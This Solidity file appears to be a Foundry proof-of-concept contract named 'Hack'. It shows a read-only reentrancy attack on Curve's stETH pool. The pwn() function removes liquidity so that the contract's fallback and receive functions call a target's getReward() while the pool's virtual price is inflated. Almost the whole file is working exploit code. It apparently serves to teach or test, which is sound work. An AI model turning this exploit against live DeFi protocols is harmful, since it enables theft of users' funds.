// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

address constant STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant LP = 0x06325440D014e39736583c165C2963BA99fAf14E;

import {ICurve} from "./ICurve.sol";
import {IERC20} from "./IERC20.sol";
import {ITarget} from "./ITarget.sol";

contract Hack {
    ICurve public constant pool = ICurve(STETH_POOL);
    IERC20 public constant lpToken = IERC20(LP);

    ITarget public target;

    constructor(address _target) {
        target = ITarget(_target);
    }

    fallback() external payable {
        // Get Virtual price for 1 LP toke After removing the position
        console.log("After removing the position", pool.get_virtual_price());

        uint reward = target.getReward();
        console.log("Reward i can get Right now!:", reward);
    }

    receive() external payable {
        // Get Virtual price for 1 LP toke After removing the position
        console.log("After removing the position", pool.get_virtual_price());

        uint reward = target.getReward();
        console.log("Reward i can get Right now!:", reward);
    }

    function setup() external payable {
        uint[2] memory amount = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amount, 0);

        lpToken.approve(address(target), lp);
        target.stake(lp);
    }

    function pwn() public payable {
        // Add Liquidity to the stETH pool
        uint[2] memory amount = [msg.value, 0];
        uint256 lp = pool.add_liquidity{value: msg.value}(amount, 0);
        // Get Virtual price for the 1 LP token before removing the position
        console.log("Before removing the position", pool.get_virtual_price());
        // Remove Liquidity from the stETH pool
        uint[2] memory min_amount = [uint(0), uint(0)];
        pool.remove_liquidity(lp, min_amount);

        // Attack - Log reward amount
        uint reward = target.getReward();
        console.log("reward", reward);

    }
}

// uint256[2] amount = [ETH, stETH]